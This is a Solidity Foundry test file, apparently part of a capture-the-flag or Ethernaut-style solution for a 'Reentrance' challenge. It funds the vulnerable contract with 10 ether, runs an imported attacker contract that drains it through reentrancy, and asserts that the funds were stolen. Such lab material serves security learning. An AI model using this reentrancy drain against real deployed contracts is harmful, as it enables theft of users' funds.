// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import {console, Test} from "@forge-std/Test.sol";

import {DeployReentranceScript} from "@script-0_6_x/10_DeployReentrance.s.sol";
import {Reentrance} from "@main-0_6_x/10_Reentrance.sol";
import {ReentranceAttacker} from "@main-0_6_x/10_ReentranceAttacker.sol";

contract ReentranceTest is Test, DeployReentranceScript {

    string mnemonic ="test test test test test test test test test test test junk";
    uint256 deployerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 1); //  address = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
    address deployer = vm.addr(deployerPrivateKey);

    address public attacker = address(11);

    ReentranceAttacker reentranceAttacker;

    function setUp() public {

        vm.deal(attacker, 0.2 ether);
        vm.label(attacker, "Attacker");

        DeployReentranceScript.run();

        reentranceChallenge.donate{value: 10 ether}(deployer);

    }

    function test_isSolved() public {
        vm.startPrank(attacker);

        // console.log('address(attacker).balance');
        // console.log(address(attacker).balance);

        assertEq( address(reentranceChallenge).balance, 10 ether);

        reentranceAttacker = new ReentranceAttacker(address(reentranceChallenge));
        reentranceAttacker.attack{value: 0.2 ether}();

        assertEq( address(reentranceChallenge).balance, 0 ether);
        assertEq( address(reentranceAttacker).balance, 10.2 ether);

        // console.log('address(attacker).balance');
        // console.log(address(attacker).balance);

        reentranceAttacker.withdrawETH( payable(attacker),  address(reentranceAttacker).balance);
        assertEq( address(attacker).balance, 10.2 ether);

        console.log('address(reentranceAttacker).balance');
        console.log(address(reentranceAttacker).balance);

        vm.stopPrank(  );
    }

}